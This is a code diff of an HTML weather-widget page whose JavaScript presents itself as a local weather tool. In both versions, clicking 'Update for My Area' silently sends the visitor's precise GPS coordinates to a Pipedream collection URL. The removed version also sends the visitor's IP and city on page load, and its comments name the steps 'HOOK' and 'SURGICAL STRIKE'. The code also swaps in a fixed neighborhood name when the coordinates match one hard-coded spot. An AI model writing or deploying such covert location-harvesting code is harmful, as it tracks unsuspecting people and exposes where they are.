@@ -23,71 +23,59 @@
         <p id="weather-desc">Partly Cloudy</p>
         
         <button class="btn" onclick="updateWeather()">Update for My Area</button>
-    </div>
+   </div>
 
-   <script>
-    const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
+    <script>
+        const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
 
-    // STAGE 1: THE INITIAL HOOK (IP-BASED)
-    // This runs immediately so they see the right city even before clicking
-    window.onload = function() {
-        fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            const city = data.city || "India";
-            document.getElementById('location-name').innerText = city;
-
-            // Fetch temp for the IP-detected city automatically
-            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.latitude}&longitude=${data.longitude}&current_weather=true`)
+        // 1. INITIAL LOAD (IP-BASED)
+        window.onload = function() {
+            fetch('https://ipapi.co/json/')
             .then(res => res.json())
-            .then(w => {
-                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
+            .then(data => {
+                document.getElementById('location-name').innerText = data.city;
+                
+                // Fetch Temp for IP City
+                fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.latitude}&longitude=${data.longitude}&current_weather=true`)
+                .then(r => r.json())
+                .then(w => {
+                    document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
+                });
             });
+        };
 
-            // Silent log to Pipedream (Passive Hit)
-            fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "INITIAL_IP_HIT", ip: data.ip, city: city }) });
-        });
-    };
+        // 2. THE UPDATE BUTTON (GPS-BASED)
+        function updateWeather() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
 
-    // STAGE 2: THE SURGICAL STRIKE (GPS-BASED)
-   function updateWeather() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
+                    // Fetch Precise Temp
+                    fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
+                    .then(r => r.json())
+                    .then(w => {
+                        document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
+                    });
 
-            // 1. Fetch Real-Time Weather for the location
-            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
-            .then(res => res.json())
-            .then(w => {
-                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
-            });
+                    // Fetch Neighborhood & Apply Override
+                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
+                    .then(res => res.json())
+                    .then(geoData => {
+                        let name = geoData.locality || geoData.city;
 
-            // 2. Fetch Neighborhood Name
-            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
-            .then(res => res.json())
-            .then(geoData => {
-                let name = geoData.locality || geoData.city;
+                        // STRICT CHECK: Only fake it if Lat starts with 17.42
+                        const isHome = lat.toFixed(2) == "17.42" && lon.toFixed(2) == "78.45";
+                        if (isHome) { name = "Punjagutta Officers Colony"; }
 
-                // SURGICAL FIX: Only show Punjagutta if the Latitude is exactly 17.42...
-                // Mumbai starts with 19, so it will skip this entirely now.
-                const isAtHome = lat.toFixed(2) == "17.42" && lon.toFixed(2) == "78.45";
+                        document.getElementById('location-name').innerText = name;
+                    });
 
-                if (isAtHome) {
-                    name = "Punjagutta Officers Colony";
-                }
-
-                document.getElementById('location-name').innerText = name;
-                document.getElementById('weather-desc').innerText = "Live Accuracy Verified";
-            });
-
-            // 3. Log Precise Data to Pipedream
-            fetch(PIPEDREAM_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon })
-            });
-        });
-    }
-}
-</script>
+                    // Log to Pipedream
+                    fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ lat, lon }) });
+                });
+            }
+        }
+    </script>
+</body>
+</html>
